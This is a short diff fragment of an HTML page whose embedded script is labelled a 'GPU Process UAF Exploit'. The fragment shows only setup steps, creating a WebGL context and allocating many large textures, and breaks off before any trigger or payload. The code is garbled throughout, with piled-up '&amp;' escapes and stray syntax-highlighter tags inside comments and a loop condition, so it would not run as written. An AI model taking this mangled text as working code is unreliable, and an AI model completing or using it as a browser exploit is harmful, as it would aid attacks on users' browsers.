@@ -34,13 +34,13 @@
 <script type='text/javascript'>
 // GPU Process UAF Exploit
 function exploit() {
- // Step 1 &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;auml;t WebGL context to initialize GPU process
+ // Step 1 &amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;auml;t WebGL context to initialize GPU process
  const canvas = document.createElement('canvas');
  const gl = canvas.getContext('webgl');
  
- // Step 2 &amp;amp;amp;amp;amp;auml;llocate GPU resources (target objects)
+ // Step 2 &amp;amp;amp;amp;auml;llocate GPU resources (target objects)
  const textures = [];
- for (let i = 0x00;i &amp;<span class="hljs-number">100</span>;i++) {
+ for (let i = 0x00;i &<span class="hljs-number">100</span>;i++) {
  const texture = gl.createTexture();
  gl.bindTexture(gl.TEXTURE_2D, texture);
  gl.texImage2D(gl.TEXTURE_2D,<span class="hljs-number">0</span>,gl.RGBA,<span class="hljs-number">1024</span>,<span class="hljs-number">1024</span>,<span class="hljs-number">0</span>,gl.RGBA,gl.UNSIGNED_BYTE,null);
